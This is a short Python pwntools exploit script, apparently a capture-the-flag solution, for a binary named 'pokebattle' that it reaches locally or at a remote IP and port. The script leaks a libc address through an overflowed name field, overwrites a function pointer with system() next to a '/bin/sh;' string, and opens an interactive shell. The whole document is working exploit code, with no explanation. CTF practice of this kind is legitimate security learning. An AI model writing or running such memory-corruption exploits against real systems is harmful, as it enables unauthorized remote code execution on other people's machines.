#!/usr/bin/env python
from pwn import *
import re

if len(sys.argv) == 1:
    s = process('./pokebattle')
else:
    s = remote('114.177.250.4', 2225)

def fight():
    s.sendlineafter('> ', '1')

def ball(slot, name):
    s.sendlineafter('> ', '2')
    s.sendlineafter('slot : \n', str(slot))
    s.sendafter('name : \n', name)

def run():
    s.sendlineafter('> ', '3')

def select(slot):
    s.sendlineafter('> ', '4')
    s.recvline()
    names = [re.match(r'.*\. (.*) /HP', s.recvline(False)).group(1) for i in range(10)]
    s.sendlineafter('Select Pokemon : \n', str(slot))
    return names

libc = ELF('./libc.so.6')

ball(0, 'A' * 8)
libc_base = u64(select(0)[0][8:].ljust(8, '\0')) - 0x3fbf5f
log.info('libc base: %#x' % libc_base)

ball(0, '/bin/sh;' + 'A' * 0x20 + p64(libc_base + libc.symbols['system']))
fight()
s.interactive()
